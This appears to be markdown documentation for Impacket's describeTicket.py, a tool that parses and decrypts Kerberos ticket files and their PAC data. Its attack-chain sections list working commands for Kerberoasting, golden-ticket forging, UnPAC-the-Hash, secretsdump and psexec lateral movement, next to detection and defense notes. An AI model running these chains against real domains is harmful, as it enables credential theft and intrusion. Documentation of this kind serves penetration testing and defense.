# describeTicket.py

## Overview
`describeTicket.py` is a comprehensive Kerberos ticket analysis tool that parses ticket files (.ccache), decrypts encrypted parts, and analyzes PAC (Privilege Attribute Certificate) information. This tool is essential for understanding ticket contents, performing advanced Kerberos attacks, and extracting credential material from tickets.

## Detailed Description
This script provides detailed analysis of Kerberos tickets stored in ccache files. It can decrypt the encrypted portion of tickets when provided with appropriate service account credentials or keys, and parse the PAC structure to reveal user privileges, group memberships, and other security information. The tool is particularly valuable for:

- **Ticket Analysis**: Understanding the contents and structure of Kerberos tickets
- **PAC Parsing**: Extracting privilege and group information from the PAC structure
- **UnPAC-the-Hash**: Extracting credential material (LM/NT hashes) from PAC credentials
- **Kerberoast Hash Generation**: Creating crackable hashes from service tickets
- **Ticket Validation**: Checking ticket validity, expiration, and flags

### Key Features:
- **Comprehensive Ticket Parsing**: Displays session keys, user information, service details, timestamps, and flags
- **PAC Structure Analysis**: Parses all PAC elements including logon info, credentials, and group memberships
- **Multiple Key Support**: Accepts passwords, NT hashes, AES keys, and custom salts for decryption
- **Kerberoast Integration**: Generates crackable hashes for offline password attacks
- **UnPAC-the-Hash Support**: Extracts LM/NT hashes from PAC credentials using AS reply keys

### Technical Details:
- Parses ccache files containing Kerberos tickets
- Supports RC4, AES128, and AES256 encryption types
- Implements PAC structure parsing according to [MS-PAC] specification
- Handles multiple credentials within a single ccache file
- Provides detailed debugging and timestamp logging options

## Command Line Options

```
usage: describeTicket.py [-h] [-debug] [-ts] [-p PASSWORD] [-hp HEXPASSWORD] [-u USER] [-d DOMAIN] [-s SALT] [--rc4 RC4]
                         [--aes HEXKEY] [--asrep-key HEXKEY]
                         ticket

Ticket describer. Parses ticket, decrypts the enc-part, and parses the PAC.

Required Arguments:
  ticket                Path to ticket.ccache file

General Options:
  -h, --help            Show help message and exit
  -debug                Turn DEBUG output ON
  -ts                   Adds timestamp to every logging output

Ticket Decryption Credentials (Optional):
  -p PASSWORD, --password PASSWORD
                        Cleartext password of the service account
  -hp HEXPASSWORD, --hex-password HEXPASSWORD
                        Hex password of the service account
  -u USER, --user USER  Name of the service account
  -d DOMAIN, --domain DOMAIN
                        FQDN Domain
  -s SALT, --salt SALT  Salt for keys calculation
                        (DOMAIN.LOCALSomeuser for users, 
                         DOMAIN.LOCALhostsomemachine.domain.local for machines)
  --rc4 RC4             RC4 KEY (i.e. NT hash)
  --aes HEXKEY          AES128 or AES256 key

PAC Credentials Decryption:
  --asrep-key HEXKEY    AS reply key for PAC Credentials decryption (UnPAC-the-Hash)
```

## Usage Examples

### Basic Ticket Analysis
```bash
# Analyze a ticket without decryption (shows basic info only)
python3 describeTicket.py /path/to/ticket.ccache

# With debug output for detailed information
python3 describeTicket.py /path/to/ticket.ccache -debug

# With timestamps in output
python3 describeTicket.py /path/to/ticket.ccache -ts
```

### Ticket Decryption with Service Account Credentials
```bash
# Using service account password
python3 describeTicket.py /path/to/ticket.ccache -u serviceaccount -d domain.local -p password123

# Using service account NT hash
python3 describeTicket.py /path/to/ticket.ccache -u serviceaccount -d domain.local --rc4 ntlmhash

# Using AES key for decryption
python3 describeTicket.py /path/to/ticket.ccache --aes aes256key

# Using custom salt for key generation
python3 describeTicket.py /path/to/ticket.ccache -u serviceaccount -s "DOMAIN.LOCALserviceaccount"
```

### Machine Account Tickets
```bash
# For machine account tickets (note the $ suffix)
python3 describeTicket.py /path/to/machine.ccache -u "COMPUTER$" -d domain.local -p machinepassword

# With custom salt for machine accounts
python3 describeTicket.py /path/to/machine.ccache -s "DOMAIN.LOCALhostcomputer.domain.local"
```

### UnPAC-the-Hash Attack
```bash
# Extract credentials from PAC using AS reply key
python3 describeTicket.py /path/to/ticket.ccache --asrep-key asreplykey

# Combined with service account decryption
python3 describeTicket.py /path/to/ticket.ccache -u serviceaccount -d domain.local --rc4 ntlmhash --asrep-key asreplykey
```

## Attack Chain Integration

### Kerberoasting Analysis
```bash
# Step 1: Get service tickets with GetUserSPNs.py
python3 GetUserSPNs.py domain.local/user:password -request -outputfile spns.out

# Step 2: Convert tickets to ccache format if needed
python3 ticketConverter.py spns.out service.ccache

# Step 3: Analyze the ticket and extract Kerberoast hash
python3 describeTicket.py service.ccache -u serviceaccount -d domain.local
```

### Golden/Silver Ticket Analysis
```bash
# Step 1: Create golden ticket with ticketer.py
python3 ticketer.py -nthash krbtgthash -domain-sid S-1-5-21-xxx -domain domain.local administrator

# Step 2: Convert and analyze the created ticket
python3 describeTicket.py administrator.ccache -debug
```

### UnPAC-the-Hash Attack Chain
```bash
# Step 1: Obtain AS-REP with getTGT.py
python3 getTGT.py domain.local/user:password

# Step 2: Extract credentials from PAC
python3 describeTicket.py user.ccache --asrep-key [AS-reply-key]

# Step 3: Use extracted hashes for further attacks
python3 secretsdump.py domain.local/user@dc.domain.local -hashes :extracted_nt_hash
```

### Ticket Analysis in Post-Exploitation
```bash
# Step 1: Extract tickets from compromised system
# (Using mimikatz or other tools to dump tickets)

# Step 2: Convert tickets to ccache format
python3 ticketConverter.py tickets.kirbi tickets.ccache

# Step 3: Analyze ticket contents and validity
python3 describeTicket.py tickets.ccache -debug

# Step 4: Use valid tickets for lateral movement
export KRB5CCNAME=tickets.ccache
python3 psexec.py -k -no-pass domain.local/user@target.domain.local
```

### Cross-Domain Attack Analysis
```bash
# Step 1: Obtain cross-domain ticket
python3 getTGT.py domain1.local/user:password

# Step 2: Get service ticket for target domain
python3 getST.py -spn cifs/server.domain2.local domain1.local/user -k

# Step 3: Analyze cross-domain ticket structure
python3 describeTicket.py user.ccache -debug
```

## Prerequisites
- Python 3.x with Impacket installed
- Access to Kerberos ticket files (.ccache format)
- Service account credentials or keys for ticket decryption (optional but recommended)
- Understanding of Kerberos authentication and PAC structure
- For UnPAC-the-Hash: AS reply key from the initial authentication

## What the Tool Reveals
When analyzing tickets, `describeTicket.py` displays:

### Basic Ticket Information:
- **User Information**: Username and realm from the ticket
- **Service Information**: Target service name and realm  
- **Time Information**: Start time, end time, renewal time, expiration status
- **Ticket Flags**: Forwardable, renewable, initial, invalid, etc.
- **Encryption**: Key type (RC4, AES128, AES256) and session key
- **Kerberoast Hash**: Crackable hash for offline password attacks (when applicable)

### Decrypted Ticket Contents (with proper credentials):
- **PAC Logon Information**: User SID, group memberships, privileges
- **PAC Credentials**: LM/NT hashes (UnPAC-the-Hash attack)
- **Additional PAC Elements**: Resource groups, extra SIDs, validation info
- **Authorization Data**: Complete privilege and access information

## Detection Considerations
- **Event IDs**: 
  - 4768: Kerberos TGT request
  - 4769: Kerberos service ticket request
  - 4771: Kerberos pre-authentication failed
- **Network Indicators**: Unusual Kerberos traffic patterns
- **File Indicators**: Presence of .ccache or .kirbi files on endpoints
- **Process Indicators**: Python processes accessing ticket files
- **Registry Indicators**: Kerberos ticket cache modifications

## Defensive Measures
- **Ticket Protection**: Secure storage and handling of Kerberos tickets
- **Service Account Security**: Strong passwords and AES encryption for service accounts
- **Monitoring**: Log and monitor Kerberos authentication events
- **Credential Guard**: Use Windows Credential Guard to protect tickets
- **Least Privilege**: Minimize service account privileges and group memberships
- **PAC Validation**: Enable PAC validation to prevent PAC manipulation attacks

## Common Issues and Troubleshooting

### Ciphertext Integrity Failed
```bash
# Error: "Ciphertext integrity failed. Most likely the account password or AES key is incorrect"
# Solution: Verify service account credentials
python3 describeTicket.py ticket.ccache -u correctuser -d domain.local -p correctpassword
```

### Missing Encryption Key
```bash
# Error: "Could not find the correct encryption key!"
# Solution: Provide the correct key type or calculate proper salt
python3 describeTicket.py ticket.ccache --rc4 ntlmhash
# Or for AES with proper salt:
python3 describeTicket.py ticket.ccache -u serviceaccount -d domain.local -s "DOMAIN.LOCALserviceaccount"
```

### Machine Account Salt Issues
```bash
# Error: Domain/user required for salt calculation
# Solution: Use proper machine account format and salt
python3 describeTicket.py ticket.ccache -u "MACHINE$" -d domain.local -p machinepassword
# Or with explicit salt:
python3 describeTicket.py ticket.ccache -s "DOMAIN.LOCALhostmachine.domain.local"
```

### Unable to Generate Kerberoast Hash
```bash
# Issue: AES256 tickets without user context
# Solution: Provide username for proper hash generation
python3 describeTicket.py ticket.ccache -u serviceaccount -d domain.local --aes aeskey
```

## Output Analysis Tips

### Understanding PAC Information:
- **User RID**: Relative identifier of the user
- **Group RIDs**: Groups the user belongs to
- **Extra SIDs**: Additional security identifiers
- **User Flags**: Account properties and restrictions
- **Logon Time**: When the user authenticated

### Ticket Validation:
- Check expiration times for ticket validity
- Verify service name matches intended target
- Examine flags for ticket properties (forwardable, renewable, etc.)
- Validate encryption type for security level

## Related Tools
- [ticketConverter.py](ticketConverter.md) - Convert between ticket formats
- [getTGT.py](getTGT.md) - Obtain Ticket Granting Tickets
- [getST.py](getST.md) - Obtain Service Tickets
- [GetUserSPNs.py](GetUserSPNs.md) - Kerberoasting attacks
- [ticketer.py](ticketer.md) - Create Golden/Silver tickets
- [secretsdump.py](secretsdump.md) - Extract credentials and secrets
- [psexec.py](psexec.md) - Lateral movement with tickets

---

*This documentation is based on the actual source code and help output of describeTicket.py from Impacket v0.12.0*
